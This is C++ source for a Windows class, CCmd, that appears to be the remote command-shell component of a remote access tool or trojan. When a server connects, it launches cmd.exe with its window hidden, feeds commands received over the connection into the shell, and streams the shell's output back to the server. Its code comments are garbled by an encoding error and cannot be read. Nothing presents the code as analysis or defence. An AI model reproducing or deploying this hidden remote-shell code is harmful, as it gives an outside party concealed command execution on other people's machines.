#include "Cmd.h"

#include <stdio.h>

CCmd::CCmd(DWORD dwIdentity):
CEventHandler(dwIdentity)
{
	m_hReadPipe = NULL;
	m_hWritePipe = NULL;

	m_hReadThread = NULL;

	memset(&m_pi, 0, sizeof(m_pi));
}


CCmd::~CCmd()
{
}
/*
	@ Date:		2022 07 11
	@ Modify:	�Ż����cmd �л���̫��������
*/

void __stdcall ReadThread(CCmd*pCmd)
{
	char buffer[0x100];

	char szMsg[0x1000];
	DWORD dwMsgLength = 0;

	DWORD dwRead = 0;
	//07 - 11
	while (true){
		BOOL bResult = PeekNamedPipe(pCmd->m_hReadPipe, buffer, 0x100, &dwRead, 0, 0);

		if (!bResult){
			//pipe is closed,  GetLastError() == 0x6d
			break;
		}
		else if(dwRead != 0){				//Read data to szMsg Buffer;
			// szMsgBuf is full
			if (dwMsgLength + dwRead + 1 > 0x1000){
				pCmd->Send(CMD_RESULT, szMsg, dwMsgLength + 1);
				dwMsgLength = 0;
			}

			ReadFile(pCmd->m_hReadPipe, szMsg + dwMsgLength, dwRead, &dwRead, 0);
			dwMsgLength += dwRead;
			szMsg[dwMsgLength] = 0;
		}
		//no data,send the data in szMsgBuffer
		else if (dwMsgLength){
			pCmd->Send(CMD_RESULT, szMsg, dwMsgLength + 1);
			dwMsgLength = 0;
		}
		else{
			Sleep(200);
		}
	}

	pCmd->Disconnect();
}

void CCmd::OnClose()
{
	//�ص�cmd.;
	if (m_pi.hProcess != NULL)
	{
		TerminateProcess(m_pi.hProcess, 0);
		//
		CloseHandle(m_pi.hProcess);
		CloseHandle(m_pi.hThread);
	}
	//�߳�ReadFile��������ȴ��߳��˳���;
	if(WAIT_TIMEOUT == WaitForSingleObject(m_hReadThread, 60000))
	{
		TerminateThread(m_hReadThread,0);
		WaitForSingleObject(m_hReadThread, INFINITE);
	}
	CloseHandle(m_hReadThread);
	//cmd ɱ����;
	//�رչܵ�.;
	CloseHandle(m_hReadPipe);
	CloseHandle(m_hWritePipe);
}
void CCmd::OnConnect()
{
	DWORD dwStatu = 0;
	dwStatu = CmdBegin();

	//�ɹ�.;
	Send(CMD_BEGIN, (char*)&dwStatu, sizeof(DWORD));

	if (dwStatu == -1){
		Disconnect();
	}
}
void CCmd::OnReadPartial(WORD Event, DWORD Total, DWORD Read, char*Buffer)
{

}
void CCmd::OnReadComplete(WORD Event, DWORD Total, DWORD Read, char*Buffer)
{
	switch (Event)
	{
	case CMD_COMMAND:
		OnCommand(Buffer);
		break;
	default:
		break;
	}
}

void CCmd::OnCommand(char*szCmd)
{
	DWORD dwWrite = 0;
	DWORD dwLeft = lstrlenA(szCmd);
	while(dwLeft>0)
	{
		dwWrite = 0;
		if (FALSE == WriteFile(m_hWritePipe, szCmd,dwLeft, &dwWrite, NULL)){	
			Disconnect();
			break;
		}
		szCmd+=dwWrite;
		dwLeft -= dwWrite;
	}
}
//cmd�˳����������:;
//		1.server �ر�	cmd�����˳�,��Ҫ�Լ��ر�.;
//		2.����exit.		Read��ʧ��.;

int CCmd::CmdBegin()
{ 
	HANDLE hCmdReadPipe = NULL, hCmdWritePipe = NULL;
	//
	SECURITY_ATTRIBUTES sa = { 0 };
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	if (FALSE == CreatePipe(&m_hReadPipe, &hCmdWritePipe, &sa, 0))
		return -1;
	if (FALSE == CreatePipe(&hCmdReadPipe,&m_hWritePipe,  &sa, 0))
		return -1;

	STARTUPINFOW si = { 0 };
	si.cb = sizeof(si);
	si.wShowWindow = SW_HIDE;
	//si.wShowWindow = SW_SHOW;
	si.hStdError = hCmdWritePipe;
	si.hStdOutput = hCmdWritePipe;
	si.hStdInput = hCmdReadPipe;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	
	//
	WCHAR szCmdPath[1024] = {0};
	GetSystemDirectoryW(szCmdPath,1024);
	lstrcatW(szCmdPath,L"\\cmd.exe");
	if (FALSE == CreateProcess(szCmdPath, NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL,NULL ,&si, &m_pi))
	{
		return -1;
	}

	//����Ҫ������,ֱ�ӹص�.;
	CloseHandle(hCmdReadPipe);
	CloseHandle(hCmdWritePipe);

	m_hReadThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadThread, this, NULL, NULL);
	if (m_hReadThread == NULL)
		return -1;
	return 0;
}